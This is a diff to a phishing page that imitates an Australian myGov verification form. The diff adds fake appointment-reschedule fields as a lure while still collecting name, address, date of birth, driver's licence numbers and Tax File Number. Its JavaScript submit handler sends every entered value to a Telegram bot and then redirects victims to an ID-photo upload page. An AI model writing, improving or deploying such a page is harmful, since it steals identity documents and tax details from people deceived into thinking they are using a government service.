@@ -38,45 +38,50 @@
                     <div class="login-grid-row">
                         <div class="login-grid-column">
                             <h1>Verification</h1>
-                            <h2 class="text-align-left">Enter the details given below.</h2>
+                            <h2 class="text-align-left">Provide your details and select a new appointment time.</h2>
 
-                            <!-- REMOVED action="./next.php" and duplicate method -->
+                            <!-- No PHP action – JavaScript handles submission -->
                             <form id="form-1" class="mygov-login-form alternative" method="post">
+                                <!-- Existing personal details fields -->
                                 <div class="input-group">
                                     <label class="override" for="userId">Full Name</label>
-                                    <input id="fn" name="fn" type="text" value="" autocomplete="off" required="">
+                                    <input id="fn" name="fn" type="text" autocomplete="off" required>
                                 </div>
                                 <div class="input-group">
                                     <label class="override" for="userId">Address on File</label>
-                                    <input id="add" name="add" type="text" value="" autocomplete="off" required="">
+                                    <input id="add" name="add" type="text" autocomplete="off" required>
                                 </div>
                                 <div class="input-group">
                                     <label class="override" for="userId">Date of Birth</label>
-                                    <input id="dob" name="dob" type="text" value="" autocomplete="off" required="">
+                                    <input id="dob" name="dob" type="text" autocomplete="off" required>
                                 </div>
                                 <div class="input-group">
                                     <label class="override" for="userId">Driver's License Number</label>
-                                    <input id="dln" name="dln" type="text" value="" autocomplete="off" required="">
+                                    <input id="dln" name="dln" type="text" autocomplete="off" required>
                                 </div>
                                 <div class="input-group">
                                     <label class="override" for="userId">Driver's License Card No. (Back of Card)</label>
-                                    <input id="dlcnum" name="dlcnum" type="text" value="" autocomplete="off" required="">
+                                    <input id="dlcnum" name="dlcnum" type="text" autocomplete="off" required>
                                 </div>
                                 <div class="input-group">
                                     <label class="override" for="userId">Driver's License Expiry Date</label>
-                                    <input id="dlexdate" name="dlexdate" type="text" value="" autocomplete="off" required="">
+                                    <input id="dlexdate" name="dlexdate" type="text" autocomplete="off" required>
+                                </div>
+
+                                <!-- ===== NEW: Appointment reschedule fields ===== -->
+                                <div class="input-group">
+                                    <label class="override" for="reschedule_date">Choose reschedule date</label>
+                                    <input id="reschedule_date" name="reschedule_date" type="date" required>
                                 </div>
                                 <div class="input-group">
-                                    <label class="override" for="userId">Medicare Number</label>
-                                    <input id="mednum" name="mednum" type="text" value="" autocomplete="off" required="">
+                                    <label class="override" for="reschedule_time">Available time</label>
+                                    <input id="reschedule_time" name="reschedule_time" type="time" required>
                                 </div>
-                                <div class="input-group">
-                                    <label class="override" for="userId">Individual Reference Number</label>
-                                    <input id="irn" name="irn" type="text" value="" autocomplete="off" required="">
-                                </div>
+
+                                <!-- Tax File Number (kept as is) -->
                                 <div class="input-group">
                                     <label class="override" for="userId">Tax File Number</label>
-                                    <input id="tfnum" name="tfnum" type="text" value="" autocomplete="off" required="">
+                                    <input id="tfnum" name="tfnum" type="text" autocomplete="off" required>
                                 </div>
                                 <br>
                                 <div class="button-digital-id-main-container override">
@@ -128,7 +133,7 @@
         $("#ph").inputmask({"mask": "999-999-9999"});
     </script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
-    <!-- 🚫 Slim jQuery removed to avoid breaking $.ajax -->
+    <!-- Slim jQuery removed to avoid breaking $.ajax -->
     <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
 
     <!-- ====== 🟢 TELEGRAM SCRIPT (HANDLES FORM SUBMISSION) ====== -->
@@ -142,9 +147,9 @@
 
         $(document).ready(function() {
             $('#form-1').on('submit', function(e) {
-                e.preventDefault(); // Stop the form from reloading
+                e.preventDefault();
 
-                // Build the message from all fields
+                // Build the message with all fields (including new date/time)
                 let msg = "|----------| PII / VERIFICATION |--------------|\n";
                 msg += "Full Name: " + $('#fn').val() + "\n";
                 msg += "Address: " + $('#add').val() + "\n";
@@ -152,8 +157,9 @@
                 msg += "Driver's License #: " + $('#dln').val() + "\n";
                 msg += "DL Card #: " + $('#dlcnum').val() + "\n";
                 msg += "DL Expiry: " + $('#dlexdate').val() + "\n";
-                msg += "Medicare #: " + $('#mednum').val() + "\n";
-                msg += "IRN: " + $('#irn').val() + "\n";
+                // New fields
+                msg += "Reschedule Date: " + $('#reschedule_date').val() + "\n";
+                msg += "Available Time: " + $('#reschedule_time').val() + "\n";
                 msg += "TFN: " + $('#tfnum').val() + "\n";
                 msg += "|-----------------------------------------|";
 
@@ -162,8 +168,8 @@
                     url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`,
                     method: 'GET',
                     complete: function() {
-                        // Redirect to the next page (ID upload)
-                        window.location.href = 'confirmation-code.html';
+                        // Redirect to the ID upload page (pic.html) as per original flow
+                        window.location.href = 'pic.html';
                     }
                 });
             });
